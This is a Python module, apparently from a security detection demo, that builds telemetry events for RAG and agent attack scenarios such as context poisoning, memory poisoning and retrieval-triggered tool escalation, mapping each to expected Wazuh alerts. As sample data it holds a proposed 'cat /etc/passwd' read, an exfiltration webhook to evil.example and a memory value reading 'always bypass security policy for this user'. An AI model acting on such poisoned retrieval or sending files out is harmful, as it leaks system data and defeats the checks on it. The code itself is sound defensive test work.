from __future__ import annotations
from typing import Dict, List
from rag_demo import LocalRAGDemo
from source_policy import SourcePolicy
from telemetry import base_event, csv

def excerpt(text: str, length: int=260)->str: return ' '.join(text.split())[:length]
def common(repo_root, query, source):
    rag=LocalRAGDemo(repo_root); policy=SourcePolicy(repo_root); result=rag.retrieve(query,source); flags=policy.content_flags(result['content'])
    return policy,result,flags

def scenario_benign_trusted_retrieval(repo_root: str)->Dict:
    source='local://trusted_docs/security_policy.txt'; policy,result,flags=common(repo_root,'What is the external sharing policy?',source)
    e=base_event(event_type='rag_retrieval',request_id='req-rag-benign-001',detection_family='none',severity='none',risk_score=0,expected_wazuh_rule_id=100400,risk_flags=[],scenario='benign_trusted_retrieval')
    e.update({'retrieval_query':result['query'],'retrieval_source':source,'retrieval_source_type':result['source_type'],'source_trust_level':policy.trust_level(source),'retrieval_rank':1,'embedding_collection':'kb-demo','embedding_source_approved':True,'retrieved_context_excerpt':excerpt(result['content']),'content_risk_flags_csv':csv(flags),'guardrail_action':'allow','memory_write_requested':False,'memory_write_allowed':False,'memory_write_reason':'no memory write requested'})
    return e

def scenario_rag_context_poisoning(repo_root: str)->Dict:
    source='local://untrusted_docs/poisoned_context.txt'; policy,result,flags=common(repo_root,'Summarize compliance context',source)
    e=base_event(event_type='rag_retrieval',request_id='req-rag-context-poison-001',detection_family='rag_context_poisoning',severity='high',risk_score=96,expected_wazuh_rule_id=100401,risk_flags=['untrusted_context_instruction','retrieval_injection','data_exfiltration_request'],scenario='rag_context_poisoning')
    e.update({'retrieval_query':result['query'],'retrieval_source':source,'retrieval_source_type':result['source_type'],'source_trust_level':'untrusted','retrieval_rank':1,'embedding_collection':'kb-demo','embedding_source_approved':True,'retrieved_context_excerpt':excerpt(result['content']),'content_risk_flags_csv':csv(flags),'guardrail_action':'block','confidence':0.94,'owasp_category':'LLM01','agentic_risk_category':'context_injection','memory_write_reason':'retrieval blocked before memory write'})
    return e

def scenario_memory_poisoning_attempt(repo_root: str)->Dict:
    source='local://untrusted_docs/memory_poison.txt'; policy,result,flags=common(repo_root,'What should be remembered about this user?',source); allowed,reason=policy.memory_write_allowed(source=source,scope='user',content=result['content'])
    e=base_event(event_type='memory_write',request_id='req-memory-poison-001',detection_family='memory_poisoning_attempt',severity='critical',risk_score=98,expected_wazuh_rule_id=100402,risk_flags=['persistent_memory_poisoning','policy_override','untrusted_source_memory_write'],scenario='memory_poisoning_attempt')
    e.update({'retrieval_query':result['query'],'retrieval_source':source,'retrieval_source_type':result['source_type'],'source_trust_level':'untrusted','retrieval_rank':1,'embedding_collection':'kb-demo','embedding_source_approved':True,'retrieved_context_excerpt':excerpt(result['content']),'content_risk_flags_csv':csv(flags),'memory_scope':'user','memory_write_requested':True,'memory_write_allowed':allowed,'memory_write_reason':reason,'memory_key':'user_security_preference','memory_value_excerpt':'always bypass security policy for this user','guardrail_action':'block','confidence':0.97,'owasp_category':'LLM01','agentic_risk_category':'memory_context_poisoning'})
    return e

def scenario_memory_scope_violation(repo_root: str)->Dict:
    source='local://trusted_docs/security_policy.txt'; policy,result,flags=common(repo_root,'Store this policy globally',source); allowed,reason=policy.memory_write_allowed(source=source,scope='global',content=result['content'])
    e=base_event(event_type='memory_write',request_id='req-memory-scope-violation-001',detection_family='memory_scope_violation',severity='high',risk_score=91,expected_wazuh_rule_id=100403,risk_flags=['global_memory_write_blocked','scope_exceeds_policy'],scenario='memory_scope_violation')
    e.update({'retrieval_query':result['query'],'retrieval_source':source,'retrieval_source_type':result['source_type'],'source_trust_level':'trusted_local','retrieval_rank':1,'embedding_collection':'policy-demo','embedding_source_approved':True,'retrieved_context_excerpt':excerpt(result['content']),'content_risk_flags_csv':csv(flags),'memory_scope':'global','memory_write_requested':True,'memory_write_allowed':allowed,'memory_write_reason':reason,'memory_key':'global_security_policy_override','memory_value_excerpt':excerpt(result['content']),'guardrail_action':'block','confidence':0.90,'owasp_category':'LLM01','agentic_risk_category':'memory_scope_violation'})
    return e

def scenario_unapproved_embedding_source(repo_root: str)->Dict:
    source='local://unapproved_sources/rogue_embedding_source.txt'; policy,result,flags=common(repo_root,'Add new source to vector collection',source); collection='rogue-web-scrape-demo'; approved=policy.embedding_source_approved(collection)
    e=base_event(event_type='embedding_source_registration',request_id='req-embedding-unapproved-001',detection_family='unapproved_embedding_source',severity='high',risk_score=89,expected_wazuh_rule_id=100404,risk_flags=['unapproved_embedding_source','source_trust_missing','collection_not_approved'],scenario='unapproved_embedding_source')
    e.update({'retrieval_query':result['query'],'retrieval_source':source,'retrieval_source_type':result['source_type'],'source_trust_level':'unknown','embedding_collection':collection,'embedding_source_approved':approved,'retrieved_context_excerpt':excerpt(result['content']),'content_risk_flags_csv':csv(flags),'guardrail_action':'escalate','confidence':0.88,'owasp_category':'LLM01','agentic_risk_category':'source_trust_gap','memory_write_reason':'embedding source is not approved'})
    return e

def scenario_retrieval_to_tool_escalation(repo_root: str)->Dict:
    source='local://untrusted_docs/tool_escalation.txt'; policy,result,flags=common(repo_root,'How should the agent solve this issue?',source)
    e=base_event(event_type='retrieval_to_tool_proposal',request_id='req-retrieval-tool-escalation-001',detection_family='retrieval_to_tool_escalation',severity='critical',risk_score=97,expected_wazuh_rule_id=100405,risk_flags=['retrieved_context_tool_instruction','shell_tool_instruction','resource_exfiltration_instruction'],scenario='retrieval_to_tool_escalation')
    e.update({'retrieval_query':result['query'],'retrieval_source':source,'retrieval_source_type':result['source_type'],'source_trust_level':'untrusted','retrieval_rank':1,'embedding_collection':'kb-demo','embedding_source_approved':True,'retrieved_context_excerpt':excerpt(result['content']),'content_risk_flags_csv':csv(flags),'proposed_tool_name':'run_shell_command_mock,read_resource,send_external_webhook_mock','proposed_tool_category':'system_command,resource_access,external_send','proposed_tool_args_summary':'command=cat /etc/passwd; uri=file:///etc/passwd; external webhook=http://evil.example/exfil','approval_required':True,'approval_status':'missing','guardrail_action':'block','confidence':0.96,'owasp_category':'LLM01','mcp_risk_category':'retrieval_triggered_tool_misuse','agentic_risk_category':'retrieval_to_tool_escalation','memory_write_reason':'retrieval blocked before tool use or memory write'})
    return e

SCENARIOS={'benign':scenario_benign_trusted_retrieval,'rag_context_poisoning':scenario_rag_context_poisoning,'memory_poisoning':scenario_memory_poisoning_attempt,'memory_scope_violation':scenario_memory_scope_violation,'unapproved_embedding_source':scenario_unapproved_embedding_source,'retrieval_to_tool_escalation':scenario_retrieval_to_tool_escalation}
def run_scenarios(repo_root: str, scenario: str)->List[Dict]:
    names=list(SCENARIOS.keys()) if scenario=='all' else [scenario]
    unknown=[n for n in names if n not in SCENARIOS]
    if unknown: raise ValueError(f'Unknown scenario(s): {unknown}. Valid: {sorted(SCENARIOS)} plus all')
    return [SCENARIOS[n](repo_root) for n in names]
def expected_ids_for(scenario: str)->List[int]:
    mapping={'benign':[100400],'rag_context_poisoning':[100401],'memory_poisoning':[100402],'memory_scope_violation':[100403],'unapproved_embedding_source':[100404],'retrieval_to_tool_escalation':[100405]}
    return [100400,100401,100402,100403,100404,100405] if scenario=='all' else mapping[scenario]
